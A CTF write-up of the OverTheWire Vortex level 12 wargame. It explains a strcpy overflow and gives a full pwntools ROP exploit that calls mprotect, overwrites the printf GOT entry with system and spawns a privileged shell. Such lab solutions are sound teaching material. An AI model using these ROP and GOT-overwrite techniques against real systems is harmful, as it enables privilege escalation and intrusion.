#vortex #pwn #otw #rop #ctf
# ToC
- [[##Level Summary]]
- [[##Level Description]]
- [[##Solution Details]]

# Vortex 12
## Level Summary
A call to `strcpy` in an unsafe thread leads to hijacked control flow.
A 'safe' thread that calls `printf` has elevated permissions - so
the idea is to overwrite the `printf` GOT entry and its argument
to gain a shell from the unsafe thread. 
NX is enabled, so a rop chain is required.

## Level Description
Level is similar to [[vortex8]] - except the stack is non-executable

As a refresher - the level makes use of two threads - one 'safe' thread,
and one 'unsafe' thread (main thread).

```c
int main(int argc, char **argv)
{
    pthread_t thread;
    int32_t unused;
    
    unused = (int32_t)&argc;
    //'Safe' code thread
    pthread_create(&thread, 0, safecode, 0);
    fix_perms(getgid(), getuid());
    //The 'unsafe' function call
    unsafecode(argv[1]);
    return 0;
}
```

The safe code elevates permissions to vortex13 by use of 'fix_perms',
then prints using '%d' and sleeps in in an infinite while loop.

```c
void safecode(void)
{
    fix_perms(getgid(), geteuid());
    do {
        printf("%d", 0);
        fflush(stdout);
        sleep(1);
    } while( true );
}
```

The 'unsafe' code is just a `strcpy` on the provided src (`argv[1]` from the call in `main`).
From there, we can hijack control flow to overwrite the `printf` GOT entry of the
'safe' code and obtain a privileged shell.

```c
void unsafecode(char *src)
{
    char *dest;
    strcpy(&dest, src);
    return;
}
```

What separates this from vortex8 is the fact that the stack is not executable.
Now, we need a rop chain to overwrite the GOT entry for printf.


## Solution details

### Overview
In order to solve this level, we want to hijack the 'safe' thread with
elevated permissions by using the 'unsafe' thread to modify the GOT
and global strings.

We can do that to change the 'safe' thread `printf("%d", 0)` call to `system("sh")`.

The exploit itself overall is relatively simple 
1. make a call to mprotect to make the `"%d"` string global writable
2. overwrite that string with 'sh',
3. overwrite printf GOT entry with the system
4. leave the 'unsafe' thread in an infinite loop so the program doesn't crash

### Gadgets/Primitives
#### Arbitrary Write
In order to overwrite the '%d' string and the printf GOT entry,
I needed a dword-sized arbitrary write.
This primitive was pretty simple, composed of only 3 gadgets from libc.
- `pop eax; ret` 
- `pop ecx; pop edx; ret`
- `mov dword ptr [eax], ecx; mov eax, edx; ret`

#### mprotect syscall
This one was a bit tougher, since it almost every argument for this syscall
required values with null bytes.
Fortunately, this version of libc contained an `xor eax, 0xffffffff; ret`
gadget, which made it relatively easy to get values with null bytes into registers.

To get a call to mprotect on the rodata section, we needed to set four registers
- eax, the syscall number (`0x7d`)
- ebx, the page-aligned address to begin the mprotect at (0x0804a008)
- ecx, the length of the mprotect (0xffffffff)
- edx, the bitmask of the protections (RWX, 0x7)

###### ECX
Setting ecx was easiest - the value has no null bytes, and can be popped directly
using one of the gadgets we'd already had for the arbitrary write:
`pop ecx; pop edx; ret`

###### EDX
Next was setting edx with the RWX prot value of 7, using the following chain:
```
pop eax; ret 
0xffffff7f
xor eax, 0xffffffff; ret
mov edx, eax; xor eax, eax; tzcnt edx, edx; add eax, edx; ret
```
The first 2 gadgets are pretty self-explanatory, and result in the value of '`0x80`'
inside of eax.
Next, I needed to get the value from eax to edx - but there was no direct `mov` or `xchg`.
I did find this gadget, however. 
`mov edx, eax; xor eax, eax; tzcnt edx, edx; add eax, edx; ret`
This places causes `tlcnt` to be ran on edx, which counts the number of 'trailing 0's'
in the src register, and places the count in the dst - edx for both.
Since `0x80 = 0b10000000`, there are 7 zeroes! 
Now edx is set

###### EBX
EBX ended up being relatively simple too.
It needs to hold the value of the page we want to modify the permissions of
(`0x0804a000`)
I found an `inc ebx` gadget, so I just popped the address of the page minus one
into ebx, then incremented it.
```
pop ebx; ret 
0x08049fff
inc ebx; ret
```

###### EAX
Finally, eax needs the syscall number - `0x7d`
This one was pretty trivial using the `xor eax, 0xffffffff` gadget.
```
pop eax; ret 
0xffffff82
xor eax, 0xffffffff
```

###### SYSCALL
Finally, we make the syscall!
This version of libc used the gs register to do so, but there were plenty
of gadgets to make a syscall.
I found this gadget:
`call dword gs:[0x10]; ret`

#### Infinite Loop
This one was easy - just popped the address of a 'jmp eax' instruction into eax,
then let it do its thing.
```
pop eax; ret
ADDR_OF_JMP_EAX
jmp eax
```

Finally I used these three 'primitives' to make a rop chain:
```python
def gen_rop():
    # Move stack address containing rop chain (for strpcy)
    rop.raw(0xffffd522)

    # Need some fill to offset start of rop chain in the stack
    rop.raw(FILL * 258)

    # mprotect on the rodata section
    call_mprotect(rop, 0x0804a000)

    # Replace global '%d' with 'sh'
    arb_write(rop, 'sssh', STR_ADDR-2, NOP)

    # Replace 'printf' GOT entry with 'system'
    arb_write(rop, SYSTEM, elf.got['printf'], NOP)

    # JMP EAX infinite loop
    rop.raw(POP_EAX)
    rop.raw(JMP_EAX)
    rop.raw(JMP_EAX)
    return rop    
```

### Exploit
And here is the full source of the exploit:

```python
#!/usr/bin/python3
from pwn import *
import sys
import os

elf = ELF('/vortex/vortex12')
elf.address = 0x8048000
libc = elf.libc
libc.address =  0xf7c00000

rop = ROP(elf, badchars=b'\x00')
libcrop = ROP(libc, badchars=b'\x00')

context.binary = elf

def call_mprotect(rop, page):
    MOV_EDX_EAX = 0x00198ca0 + libc.address # mov edx, eax; xor eax, eax; tzcnt edx, edx; add eax, edx; ret
    XOR_EAX_FFFFFFFF = 0x001192f0 + libc.address # xor eax, 0xffffffff; ret
    MOV_EAX_ECX = 0x0002f6ac + libc.address # mov eax, ecx; ret
    INC_EBX = 0x0006b229 + libc.address # inc ebx; ret 
    NOP = 0x0002fce8 + libc.address # nop; ret
    SYSCALL = 0x000df619 + libc.address # call dword gs:[0x10]; ret
    JMP_EAX = 0x000218e7 + libc.address # jmp eax
    POP_EDI = 0x00021e78 + libc.address
    POP_EAX = 0x0002ed92 + libc.address
    POP_EBX = 0x0002c01f + libc.address
    POP_ECX_POP_EDX = 0x00037374 + libc.address # pop ecx; pop edx; ret

    # Get length of '0xffffffff' into ecx
    rop.raw(POP_ECX_POP_EDX)
    rop.raw(0xffffffff)
    rop.raw(0xffffffff)
    
    # Get '7' into edx (prot of RWX)
    rop.raw(POP_EAX)
    rop.raw(0xffffff7f)
    rop.raw(XOR_EAX_FFFFFFFF)
    # TZCNT counts trailing 0's, then adds them
    # Get 0x80 into EDX, TZCNT should set it to 7
    rop.raw(MOV_EDX_EAX)

    # Get page of '%d' address into ebx
    rop.raw(POP_EBX)
    rop.raw(page-1)
    rop.raw(INC_EBX)

    # Get 0x7d into eax (mprotect)
    rop.raw(POP_EAX)
    rop.raw(0xffffff82)
    rop.raw(XOR_EAX_FFFFFFFF)

    # Make mprotect syscall
    rop.raw(SYSCALL)


# Mangles edx, ecx, eax
def arb_write(rop, val, dst, next_gadget):
    FILL = 'AAAA'
    POP_EAX = 0x0002ed92 + libc.address
    POP_ECX_POP_EDX = 0x00037374 + libc.address # pop ecx; pop edx; ret
    WR = 0x000f772a + libc.address # mov dword ptr [eax], ecx; mov eax, edx; ret;

    rop.raw(POP_EAX)
    rop.raw(dst)
    rop.raw(POP_ECX_POP_EDX)
    rop.raw(val)
    rop.raw(FILL)
    rop.raw(WR)
    rop.raw(next_gadget)
    

# mprotect to make '%d' string area writeable
# write 'sssh' to '%d' loc-2 (thereby pushing sh into string)
# finally, overwrite 'printf' got entry with addr of system
# ???
# profit

def gen_rop():
    global rop
    POP_EAX = 0x0002ed92 + libc.address
    JMP_EAX = 0x000218e7 + libc.address
    SYSTEM = 0x48170 + libc.address 
    STR_ADDR = 0x0804a008
    NOP = 0x0002fce8 + libc.address # nop; ret
    FILL = 'AAAA'

    # Move stack address containing rop chain (for strpcy)
    rop.raw(0xffffd522)

    # Need some fill to offset start of rop chain in the stack
    rop.raw(FILL * 258)

    # mprotect on the rodata section
    call_mprotect(rop, 0x0804a000)
    # Replace global '%d' with 'sh'
    arb_write(rop, 'sssh', STR_ADDR-2, NOP)

    # Replace 'printf' GOT entry with 'system'
    arb_write(rop, SYSTEM, elf.got['printf'], NOP)

    # JMP EAX infinite loop
    rop.raw(POP_EAX)
    rop.raw(JMP_EAX)
    rop.raw(JMP_EAX)
    return rop


def main():
    rop = gen_rop()
    # print(hexdump(rop))
    # os.execl('/bin/gdb', 'gdb', "--args", "/vortex/vortex12", rop.chain())
    os.execl('/vortex/vortex12', 'vortex12', rop.chain())


if __name__ == '__main__':
    main()
```
